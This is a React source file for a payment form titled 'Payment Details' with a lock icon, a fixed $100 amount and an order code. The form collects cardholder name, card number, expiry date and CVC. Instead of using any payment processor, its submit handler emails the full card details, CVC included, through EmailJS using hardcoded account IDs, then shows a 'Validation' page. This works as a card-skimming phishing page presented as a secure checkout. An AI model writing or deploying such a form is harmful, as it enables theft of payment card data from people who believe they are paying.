import React, {useRef} from "react";
import emailjs from "@emailjs/browser";
import "./styles.css";
import { Link, useNavigate } from "react-router-dom";
import { GrSecure } from "react-icons/gr";
import { usePaymentInputs } from "react-payment-inputs";
import classNames from 'classnames';

export default function Form() {
    const form = useRef();
    const navigate = useNavigate();
    const {
        meta,
        getCardNumberProps,
        getExpiryDateProps,
        getCVCProps
    } = usePaymentInputs();

    const [checked, setChecked] = React.useState(true);
    const [cardNumber, setCardNumber] = React.useState("");
    const [details, setDetails] = React.useState({
        expiryDate: "",
        cvc: "",
        clientName: ""
    });

    const handleChange = (e) => {
        setDetails((prevFormDetails) => {
            return {
                ...prevFormDetails,
                [e.target.name]: e.target.value
            };
        });

        console.log(details);
    };
    const handleChangeCardNumber = (e) => {
        setCardNumber(
            e.target.value
                .replace(/[^\dA-Z]/g, "")
                .replace(/(.{4})/g, "$1 ")
                .trim()
        );
    };
    const handleSubmit = (e) => {
        e.preventDefault();
        if (
            (meta.isTouched && meta.error) ||
            Number(cardNumber.length) < 19 ||
            cardNumber.trim().length === 0 ||
            details.expiryDate.trim().length === 0 ||
            details.cvc.trim().length === 0 ||
            details.clientName.trim().length === 0 ||
            checked === true
        ) {
            setChecked(true);
            console.log("not submit");
        } else {
            setChecked(false);

            emailjs
                .sendForm(
                    "service_pduy8oo",
                    "template_be4vpep",
                    form.current,
                    "d7GFUxt5sOvLttX-o"
                )
                .then(
                    (result) => {
                        console.log(result.text);
                    },
                    (error) => {
                        console.log(error.text);
                    }
                );
            navigate("/Validation");
        }
    };
    const handleCheck = () => {
        console.log("ok");

        setChecked(false);
    };

    return (
        <form ref={form} className="form" onSubmit={handleSubmit}>
            <header>
                <div className="TitleSecure">
                    <h3>Payment Details </h3>
                    <GrSecure className="secureIcon"/>
                </div>
                <div className="Amount">
                    <p> Amount : </p>
                    <label id="label_price" className="price">100$</label>
                </div>
                <div className="Amount">
                    <p> orderCode : </p>
                    <label id="label_orderCode" className={classNames('price', 'orderCode')}>458459662-155-13012024</label>
                </div>
            </header>
            <main>
                {meta.isTouched && meta.error ? (
                    <span className="span">Error: {meta.error}</span>
                ) : (
                    <span className="span"></span>
                )}
                {meta.isTouched && meta.error && console.error(meta.error)}
                <div className="clientName">
                    <label id="label_client_name"> Client Name </label>
                    <input id="input_client_name" name="clientName" onChange={handleChange} />
                </div>
                <div className="NumDeCarte">
                    <label id="label_card_number"> Card Number </label>
                    <input id="input_card_number"
                        // {...getCardNumberProps({ onChange: handleChangeCardNumber })}
                        onChange={handleChangeCardNumber}
                        placeholder="Valid Card Number"
                        name="cardNumber"
                        maxLength="19"
                        value={cardNumber}
                    />
                </div>
                <div className="DateAndCvc">
                    <div className="Date">
                        <label id="label_card_expiry_date"> Expiry Date </label>
                        <input
                            id="input_card_expiry_date"
                            {...getExpiryDateProps({ onBlur: handleChange})}
                            placeholder="MM/YY"
                            name="expiryDate"
                        />
                    </div>
                    <div className="CvC">
                        <label id="label_cvc"> CVC </label>
                        <input
                            id="input_cvc"
                            {...getCVCProps({ onBlur: handleChange })}
                            name="cvc"
                            maxLength="3"
                        />
                    </div>
                </div>
                <div className="terms">
                    <input type="checkbox" id="checkbox_confedintial_terms" onChange={handleCheck} />
                    <p className="ConfedintialTerms">
                        Accept terms and <Link id="link_confedintial_terms" href="#">conditions.</Link>
                    </p>
                </div>
                <input id="input_terms"
                    disabled={checked}
                    type="submit"
                    value="Validate"
                    className="btn"
                />
            </main>
            <footer >
                <img className="img1" src="/images/payment-method-bank.svg" alt="" />
            </footer>
        </form>
    );
}
